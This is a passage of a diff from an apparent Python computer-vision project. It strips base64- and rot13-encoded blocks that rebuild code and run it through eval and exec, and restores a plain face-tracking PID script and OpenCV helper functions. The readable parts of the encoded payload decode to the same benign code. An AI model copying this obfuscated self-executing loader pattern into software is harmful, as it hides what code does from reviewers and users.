-magic = 'aW1wb3J0IGN2em9uZQppbXBvcnQgY3YyCmltcG9ydCBudW1weSBhcyBucAppbXBvcnQgdGltZQoKCmNsYXNzIFBJRDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwaWRWYWxzLCB0YXJnZXRWYWwsIGF4aXM9MCwgbGltaXQ9Tm9uZSk6CiAgICAgICAgc2VsZi5waWRWYWxzID0gcGlkVmFscwogICAgICAgIHNlbGYudGFyZ2V0VmFsID0gdGFyZ2V0VmFsCiAgICAgICAgc2VsZi5heGlzID0gYXhpcwogICAgICAgIHNlbGYucEVycm9yID0gMAogICAgICAgIHNlbGYubGltaXQgPSBsaW1pdAogICAgICAgIHNlbGYuSSA9IDAKICAgICAgICBzZWxmLnBUaW1lID0gMAoKICAgIGRlZiB1cGRhdGUoc2VsZiwgY1ZhbCk6CiAgICAgICAgIyBDdXJyZW50IFZhbHVlIC0gVGFyZ2V0IFZhbHVlCiAgICAgICAgdCA9IHRpbWUudGltZSgpIC0gc2VsZi5wVGltZQogICAgICAgIGVycm9yID0gY1ZhbCAtIHNlbGYudGFyZ2V0VmFsCiAgICAgICAgUCA9IHNlbGYucGlkVmFsc1swXSAqIGVycm9yCiAgICAgICAgc2VsZi5JID0gc2VsZi5JICsgKHNlbGYucGlkVmFsc1sxXSAqIGVycm9yICogdCkKICAgICAgICB'
-love = 'RVQ0tXUAyoTLhpTyxIzSfp1flKFNdVPuypaWipvNgVUAyoTLhpRIlpz9lXFxtYlO0PtbtVPNtVPNtVUWyp3IfqPN9VSNtXlOmMJkzYxxtXlORPtbtVPNtVPNtVTyzVUAyoTLhoTygnKDtnKZtoz90VR5iozH6PvNtVPNtVPNtVPNtVUWyp3IfqPN9VTMfo2S0XT5jYzAfnKNbpzImqJk0YPOmMJkzYzkcoJy0JmOqYPOmMJkzYzkcoJy0JmSqXFxXVPNtVPNtVPOmMJkzYaOSpaWipvN9VTIlpz9lPvNtVPNtVPNtp2IfMv5jqTygMFN9VUEcoJHhqTygMFtcPtbtVPNtVPNtVUWyqUIlovOlMKA1oUDXPvNtVPOxMJLtMUWuqlumMJkzYPOcoJpfVTAJLJjcBtbtVPNtVPNtVTtfVUpfVS8tCFOcoJphp2uupTHXVPNtVPNtVPOcMvOmMJkzYzS4nKZtCG0tZQbXVPNtVPNtVPNtVPNtL3LlYzkcozHbnJ1aYPNbp2IfMv50LKWaMKEJLJjfVQNcYPNbp2IfMv50LKWaMKEJLJjfVTtcYPNbZwH1YPNjYPNlAGHcYPNkXDbtVPNtVPNtVPNtVPOwqwVhoTyhMFucoJpfVPumMJkzYaEupzqyqSMuoPjtL1MuoSfkKFxfVPuwIzSfJmOqYPOwIzSfJmSqXFjtXQV1AFjtZPjtZwH1XFjtZFjtZPxXVPNtVPNtVPOyoUAyBtbtVP'
-god = 'AgICAgICAgICBjdjIubGluZShpbWcsICgwLCBzZWxmLnRhcmdldFZhbCksICh3LCBzZWxmLnRhcmdldFZhbCksICgyNTUsIDAsIDI1NSksIDEpCiAgICAgICAgICAgIGN2Mi5saW5lKGltZywgKGNWYWxbMF0sIHNlbGYudGFyZ2V0VmFsKSwgKGNWYWxbMF0sIGNWYWxbMV0pLCAoMjU1LCAwLCAyNTUpLCAxLCAwKQoKICAgICAgICBjdjIuY2lyY2xlKGltZywgdHVwbGUoY1ZhbCksIDUsICgyNTUsIDAsIDI1NSksIGN2Mi5GSUxMRUQpCgogICAgICAgIHJldHVybiBpbWcKCgpkZWYgbWFpbigpOgogICAgY2FwID0gY3YyLlZpZGVvQ2FwdHVyZSgwKQogICAgZGV0ZWN0b3IgPSBjdnpvbmUuRmFjZURldGVjdG9yKCkKICAgICMgRm9yIGEgNjQweDQ4MCBpbWFnZSBjZW50ZXIgdGFyZ2V0IGlzIDMyMCBhbmQgMjQwCiAgICB4UElEID0gUElEKFsxLCAwLjAwMDAwMDAwMDAwMSwgMV0sIDY0MCAvLyAyKQogICAgeVBJRCA9IFBJRChbMSwgMC4wMDAwMDAwMDAwMDEsIDFdLCA0ODAgLy8gMiwgYXhpcz0xLCBsaW1pdD1bLTEwMCwgMTAwXSkKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHN1Y2Nlc3MsI'
-destiny = 'TygMlN9VTAupP5lMJSxXPxXVPNtVPNtVPOcoJpfVTWvo3umVQ0tMTI0MJA0o3VhMzyhMRMuL2ImXTygMlxXVPNtVPNtVPOcMvOvLz94pmbXVPNtVPNtVPNtVPNtrPjtrFjtqljtnPN9VTWvo3umJmOqJlWvLz94Vy0XVPNtVPNtVPNtVPNtL3tfVTA5VQ0tLzWirUAoZS1oVzAyoaEypvWqPvNtVPNtVPNtVPNtVUuJLJjtCFOcoaDbrSOWEP51pTEuqTHbL3tcXDbtVPNtVPNtVPNtVPO5IzSfVQ0tnJ50XUyDFHDhqKOxLKEyXTA5XFxXPvNtVPNtVPNtVPNtVUuDFHDhMUWuqlucoJpfVSgwrPjtL3yqXDbtVPNtVPNtVPNtVPO5HRyRYzElLKpbnJ1aYPOoL3tfVTA5KFxXPvNtVPNtVPNtVPNtVTA2Zv5jqKEHMKu0XTygMljtMvq4Bag4IzSfsFNfVUx6r3yJLJk9VPpfVPu4YPO5VP0tZGNjXFjtL3LlYxMCGyEsFRIFH0uSJI9DGRSWGvjtZljXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtXQV1AFjtZPjtZPxfVQZcPtbtVPNtVPNtVTA2Zv5coKAbo3pbVxygLJqyVvjtnJ1aXDbtVPNtVPNtVTA2Zv53LJy0F2I5XQRcPtbXnJLtK19hLJ1yK18tCG0tVy9soJScoy9sVwbXVPNtVT1unJ4bXDbtVPNtPvNtVPNX'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+import cvzone
+import cv2
+import numpy as np
+import time
+
+
+class PID:
+    def __init__(self, pidVals, targetVal, axis=0, limit=None):
+        self.pidVals = pidVals
+        self.targetVal = targetVal
+        self.axis = axis
+        self.pError = 0
+        self.limit = limit
+        self.I = 0
+        self.pTime = 0
+
+    def update(self, cVal):
+        # Current Value - Target Value
+        t = time.time() - self.pTime
+        error = cVal - self.targetVal
+        P = self.pidVals[0] * error
+        self.I = self.I + (self.pidVals[1] * error * t)
+        D = (self.pidVals[2] * (error - self.pError)) / t
+
+        result = P + self.I + D
+
+        if self.limit is not None:
+            result = float(np.clip(result, self.limit[0], self.limit[1]))
+        self.pError = error
+        self.ptime = time.time()
+
+        return result
+
+    def draw(self, img, cVal):
+        h, w, _ = img.shape
+        if self.axis == 0:
+            cv2.line(img, (self.targetVal, 0), (self.targetVal, h), (255, 0, 255), 1)
+            cv2.line(img, (self.targetVal, cVal[1]), (cVal[0], cVal[1]), (255, 0, 255), 1, 0)
+        else:
+            cv2.line(img, (0, self.targetVal), (w, self.targetVal), (255, 0, 255), 1)
+            cv2.line(img, (cVal[0], self.targetVal), (cVal[0], cVal[1]), (255, 0, 255), 1, 0)
+
+        cv2.circle(img, tuple(cVal), 5, (255, 0, 255), cv2.FILLED)
+
+        return img
+
+
+def main():
+    cap = cv2.VideoCapture(0)
+    detector = cvzone.FaceDetector()
+    # For a 640x480 image center target is 320 and 240
+    xPID = PID([1, 0.000000000001, 1], 640 // 2)
+    yPID = PID([1, 0.000000000001, 1], 480 // 2, axis=1, limit=[-100, 100])
+
+    while True:
+        success, img = cap.read()
+        img, bboxs = detector.findFaces(img)
+        if bboxs:
+            x, y, w, h = bboxs[0]["bbox"]
+            cx, cy = bboxs[0]["center"]
+            xVal = int(xPID.update(cx))
+            yVal = int(yPID.update(cy))
+
+            xPID.draw(img, [cx, cy])
+            yPID.draw(img, [cx, cy])
+
+            cv2.putText(img, f'x:{xVal} , y:{yVal} ', (x, y - 100), cv2.FONT_HERSHEY_PLAIN, 3,
+                        (255, 0, 0), 3)
+
+        cv2.imshow("Image", img)
+        cv2.waitKey(1)
+
+
+if __name__ == "__main__":
+    main()
+    
+
```

## helloai/utils/cvzone.py

```diff
@@ -1,8 +1,190 @@
-import base64, codecs
-magic = 'IiIiClN1cHBvcnRpbmcgRnVuY3Rpb25zIGZvciBDb21wdXRlciB2aXNpb24gdXNpbmcgT3BlbkNWCkJ5OiBDb21wdXRlciBWaXNpb24gWm9uZQpXZWJzaXRlOiBodHRwczovL3d3dy5jb21wdXRlcnZpc2lvbi56b25lLwoiIiIKCmltcG9ydCBjdjIKaW1wb3J0IG51bXB5IGFzIG5wCmltcG9ydCBjb3B5CgoKZGVmIHN0YWNrSW1hZ2VzKF9pbWdMaXN0LCBjb2xzLCBzY2FsZSk6CiAgICAiIiIKICAgIFN0YWNrIEltYWdlcyB0b2dldGhlciB0byBkaXNwbGF5IGluIGEgc2luZ2xlIHdpbmRvdwogICAgOnBhcmFtIF9pbWdMaXN0OiBsaXN0IG9mIGltYWdlcyB0byBzdGFjawogICAgOnBhcmFtIGNvbHM6IHRoZSBudW0gb2YgaW1nIGluIGEgcm93CiAgICA6cGFyYW0gc2NhbGU6IGJpZ2dlcn4xKyBhbnMgc21hbGxlcn4xLQogICAgOnJldHVybjogU3RhY2tlZCBJbWFnZQogICAgIiIiCiAgICBpbWdMaXN0ID0gY29weS5kZWVwY29weShfaW1nTGlzdCkKCiAgICAjIG1ha2UgdGhlIGFycmF5IGZ1bGwgYnkgYWRkaW5nIGJsYW5rIGltZywgb3RoZXJ3aXNlIHRoZSBvcGVuQ1YgY2FuJ3Qgd29yawogICAgdG90YWxJbWFnZXMgPSBsZW4oaW1nTGlzdCkKICAgIHJvd3MgPSB0b3RhbEltYWdlcyAvLyBjb2xzIGlmIHRvdGFsSW1hZ2VzIC8vIGNvbHMgKiBjb2xzID09IHRvdGFsSW1hZ2VzIGVsc2UgdG90YWxJbWFnZXMgLy8gY29scyArIDEKICAgIGJsYW5rSW1hZ2VzID0gY29scyAqIHJvd3MgLSB0b3RhbEltYWdlcwoKICAgIHdpZHRoID0gaW1nTGlzdFswXS5zaGFwZVsxXQogICAgaGVpZ2h0ID0gaW1nTGlzdFswXS5zaGFwZVswXQogICAgaW1nQmxhbmsgPSBucC56ZXJvcygoaGVpZ2h0LCB3aWR0aCwgMyksIG5wLnVpbnQ4KQogICAgaW1nTGlzdC5leHRlbmQoW2ltZ0JsYW5rXSAqIGJsYW5rSW1hZ2VzKQoKICAgICMgcmVzaXplIHRoZSBpbWFnZXMKICAgIGZvciBpIGluIHJhbmdlKGNvbHMgKiByb3dzKToKICAgICAgICBpbWdMaXN0W2ldID0gY3YyLnJlc2l6ZShpbWdMaXN0W2ldLCAoMCwgMCksIE5vbmUsIHNjYWxlLCBzY2FsZSkKICAgICAgICBpZiBsZW4oaW1nTGlzdFtpXS5zaGFwZSkgPT0gMjoKICAgICAgICAgICAgaW1nTGlzdFtpXSA9IGN2Mi5jdnRDb2xvcihpbWdMaXN0W2ldLCBjdjIuQ09MT1JfR1JBWTJCR1IpCgogICAgIyBwdXQgdGhlIGltYWdlcyBpbiBhIGJvYXJkCiAgICBob3IgPSBbaW1nQmxhbmtdICogcm93cwogICAgZm9yIHkgaW4gcmFuZ2Uocm93cyk6CiAgICAgICAgbGluZSA9IFtdCiAgICAgICAgZm9yIHggaW4gcmFuZ2UoY29scyk6CiAgICAgICAgICAgIGxpbmUuYXBwZW5kKGltZ0xpc3RbeSAqIGNvbHMgKyB4XSkKICAgICAgICBob3JbeV0gPSBucC5oc3RhY2sobGluZSkKICAgIHZlciA9IG5wLnZzdGFjayhob3IpCiAgICByZXR1cm4gdmVyCgoKZGVmIGNvcm5lclJlY3QoaW1nLCBiYm94LCBsPTMwLCB0PTUsIHJ0PTEsCiAgICAgICAgICAgICAgIGNvbG9yUj0oMjU1LCAwLCAyNTUpLCBjb2xvckM9KDAsIDI1NSwgMCkpOgogICAgIiIiCiAgICA6cGFyYW0gaW1nOiBJbWFnZSB0byBkcmF3IG9uLgogICAgOnBhcmFtIGJib3g6IEJvdW5kaW5nIGJveCBbeCwgeSwgdywgaF0KICAgIDpwYXJhbSBsOiBsZW5ndGggb2YgdGhlIGNvcm5lciBsaW5lCiAgICA6cGFyYW0gdDogdGhpY2tuZXNzIG9mIHRoZSBjb3JuZXIgbGlu'
-love = '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'
-god = 'KiBwZXJpLCBUcnVlKQogICAgICAgICAgICAjIHByaW50KGxlbihhcHByb3gpKQogICAgICAgICAgICBpZiBsZW4oYXBwcm94KSA9PSBmaWx0ZXIgb3IgZmlsdGVyID09IDA6CiAgICAgICAgICAgICAgICBpZiBkcmF3Q29uOiBjdjIuZHJhd0NvbnRvdXJzKGltZ0NvbnRvdXJzLCBjbnQsIC0xLCBjLCAzKQogICAgICAgICAgICAgICAgeCwgeSwgdywgaCA9IGN2Mi5ib3VuZGluZ1JlY3QoYXBwcm94KQogICAgICAgICAgICAgICAgY3gsIGN5ID0geCArICh3IC8vIDIpLCB5ICsgKGggLy8gMikKICAgICAgICAgICAgICAgIGN2Mi5yZWN0YW5nbGUoaW1nQ29udG91cnMsICh4LCB5KSwgKHggKyB3LCB5ICsgaCksIGMsIDIpCiAgICAgICAgICAgICAgICBjdjIuY2lyY2xlKGltZ0NvbnRvdXJzLCAoeCArICh3IC8vIDIpLCB5ICsgKGggLy8gMikpLCA1LCBjLCBjdjIuRklMTEVEKQogICAgICAgICAgICAgICAgY29uRm91bmQuYXBwZW5kKHsiY250IjogY250LCAiYXJlYSI6IGFyZWEsICJiYm94IjogW3gsIHksIHcsIGhdLCAiY2VudGVyIjogW2N4LCBjeV19KQoKICAgIGlmIHNvcnQ6CiAgICAgICAgY29uRm91bmQgPSBzb3J0ZWQoY29uRm91bmQsIGtleT1sYW1iZGEgeDogeFsiYXJlYSJdLCByZXZlcnNlPVRydWUpCgogICAgcmV0dXJuIGltZ0NvbnRvdXJzLCBjb25Gb3VuZAoKCmRlZiBvdmVybGF5UE5HKGltZ0JhY2ssIGltZ0Zyb250LCBwb3M9WzAsIDBdKToKICAgIGhmLCB3ZiwgY2YgPSBpbWdGcm9udC5zaGFwZQogICAgaGIsIHdiLCBjYiA9IGltZ0JhY2suc2hhcGUKICAgICpfLCBtYXNrID0gY3YyLnNwbGl0KGltZ0Zyb250KQogICAgbWFza0JHUkEgPSBjdjIuY3Z0Q29sb3IobWFzaywgY3YyLkNPTE9SX0dSQVkyQkdSQSkKICAgIG1hc2tCR1IgPSBjdjIuY3Z0Q29sb3IobWFzaywgY3YyLkNPTE9SX0dSQVkyQkdSKQogICAgaW1nUkdCQSA9IGN2Mi5iaXR3aXNlX2FuZChpbWdGcm9udCwgbWFza0JHUkEpCiAgICBpbWdSR0IgPSBjdjIuY3Z0Q29sb3IoaW1nUkdCQSwgY3YyLkNPTE9SX0JHUkEyQkdSKQoKICAgIGltZ01hc2tGdWxsID0gbnAuemVyb3MoKGhiLCB3YiwgY2IpLCBucC51aW50OCkKICAgIGltZ01hc2tGdWxsW3Bvc1sxXTpoZiArIHBvc1sxXSwgcG9zWzBdOndmICsgcG9zWzBdLCA6XSA9IGltZ1JHQgogICAgaW1nTWFza0Z1bGwyID0gbnAub25lcygoaGIsIHdiLCBjYiksIG5wLnVpbnQ4KSAqIDI1NQogICAgbWFza0JHUkludiA9IGN2Mi5iaXR3aXNlX25vdChtYXNrQkdSKQogICAgaW1nTWFza0Z1bGwyW3Bvc1sxXTpoZiArIHBvc1sxXSwgcG9zWzBdOndmICsgcG9zWzBdLCA6XSA9IG1hc2tCR1JJbnYKCiAgICBpbWdCYWNrID0gY3YyLmJpdHdpc2VfYW5kKGltZ0JhY2ssIGltZ01hc2tGdWxsMikKICAgIGltZ0JhY2sgPSBjdjIuYml0d2lzZV9vcihpbWdCYWNrLCBpbWdNYXNrRnVsbCkKCiAgICByZXR1cm4gaW1nQmFjawoKCmRlZiByb3RhdGVJbWFnZShpbWcsIGFuZ2xlLCBzY2FsZT0xKToKICAgIGgsIHcgPSBpbWcuc2hhcGVbOjJdCiAgICBjZW50ZXIgPSAodyAvIDIsIGggLyAyKQogICAgcm90YXRlX21hdHJpeCA9IGN2Mi5nZXRSb3RhdGlvbk1hdHJpeDJEKGNlbnRlcj1jZW50ZXIsIGFuZ2xlPWFuZ2xlLCBzY2FsZT1zY2FsZSkKICAgIGltZyA9IGN2Mi53YXJwQWZmaW5lKHNyYz1pbWcsIE09cm90YXRlX21hdHJp'
-destiny = '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'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+"""
+Supporting Functions for Computer vision using OpenCV
+By: Computer Vision Zone
+Website: https://www.computervision.zone/
+"""
+
+import cv2
+import numpy as np
+import copy
+
+
+def stackImages(_imgList, cols, scale):
+    """
+    Stack Images together to display in a single window
+    :param _imgList: list of images to stack
+    :param cols: the num of img in a row
+    :param scale: bigger~1+ ans smaller~1-
+    :return: Stacked Image
+    """
+    imgList = copy.deepcopy(_imgList)
+
+    # make the array full by adding blank img, otherwise the openCV can't work
+    totalImages = len(imgList)
+    rows = totalImages // cols if totalImages // cols * cols == totalImages else totalImages // cols + 1
+    blankImages = cols * rows - totalImages
+
+    width = imgList[0].shape[1]
+    height = imgList[0].shape[0]
+    imgBlank = np.zeros((height, width, 3), np.uint8)
+    imgList.extend([imgBlank] * blankImages)
+
+    # resize the images
+    for i in range(cols * rows):
+        imgList[i] = cv2.resize(imgList[i], (0, 0), None, scale, scale)
+        if len(imgList[i].shape) == 2:
+            imgList[i] = cv2.cvtColor(imgList[i], cv2.COLOR_GRAY2BGR)
+
+    # put the images in a board
+    hor = [imgBlank] * rows
+    for y in range(rows):
+        line = []
+        for x in range(cols):
+            line.append(imgList[y * cols + x])
+        hor[y] = np.hstack(line)
+    ver = np.vstack(hor)
+    return ver
+
+
+def cornerRect(img, bbox, l=30, t=5, rt=1,
+               colorR=(255, 0, 255), colorC=(0, 255, 0)):
+    """
+    :param img: Image to draw on.
+    :param bbox: Bounding box [x, y, w, h]
+    :param l: length of the corner line
+    :param t: thickness of the corner line
+    :param rt: thickness of the rectangle
+    :param colorR: Color of the Rectangle
+    :param colorC: Color of the Corners
+    :return:
+    """
+    x, y, w, h = bbox
+    x1, y1 = x + w, y + h
+    if rt != 0:
+        cv2.rectangle(img, bbox, colorR, rt)
+    # Top Left  x,y
+    cv2.line(img, (x, y), (x + l, y), colorC, t)
+    cv2.line(img, (x, y), (x, y + l), colorC, t)
+    # Top Right  x1,y
+    cv2.line(img, (x1, y), (x1 - l, y), colorC, t)
+    cv2.line(img, (x1, y), (x1, y + l), colorC, t)
+    # Bottom Left  x,y1
+    cv2.line(img, (x, y1), (x + l, y1), colorC, t)
+    cv2.line(img, (x, y1), (x, y1 - l), colorC, t)
+    # Bottom Right  x1,y1
+    cv2.line(img, (x1, y1), (x1 - l, y1), colorC, t)
+    cv2.line(img, (x1, y1), (x1, y1 - l), colorC, t)
+
+    return img
+
+
+def findContours(img, imgPre, minArea=1000, sort=True, filter=0, drawCon=True, c=(255, 0, 0)):
+    """
+    Finds Contours in an image
+    :param img: Image on which we want to draw
+    :param imgPre: Image on which we want to find contours
+    :param minArea: Minimum Area to detect as valid contour
+    :param sort: True will sort the contours by area (biggest first)
+    :param filter: Filters based on the corner points e.g. 4 = Rectangle or square
+    :param drawCon: draw contours boolean
+    :return: Foudn contours with [contours, Area, BoundingBox, Center]
+    """
+    conFound = []
+    imgContours = img.copy()
+    contours, hierarchy = cv2.findContours(imgPre, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE)
+
+    for cnt in contours:
+        area = cv2.contourArea(cnt)
+        if area > minArea:
+            peri = cv2.arcLength(cnt, True)
+            approx = cv2.approxPolyDP(cnt, 0.02 * peri, True)
+            # print(len(approx))
+            if len(approx) == filter or filter == 0:
+                if drawCon: cv2.drawContours(imgContours, cnt, -1, c, 3)
+                x, y, w, h = cv2.boundingRect(approx)
+                cx, cy = x + (w // 2), y + (h // 2)
+                cv2.rectangle(imgContours, (x, y), (x + w, y + h), c, 2)
+                cv2.circle(imgContours, (x + (w // 2), y + (h // 2)), 5, c, cv2.FILLED)
+                conFound.append({"cnt": cnt, "area": area, "bbox": [x, y, w, h], "center": [cx, cy]})
+
+    if sort:
+        conFound = sorted(conFound, key=lambda x: x["area"], reverse=True)
+
+    return imgContours, conFound
+
+
+def overlayPNG(imgBack, imgFront, pos=[0, 0]):
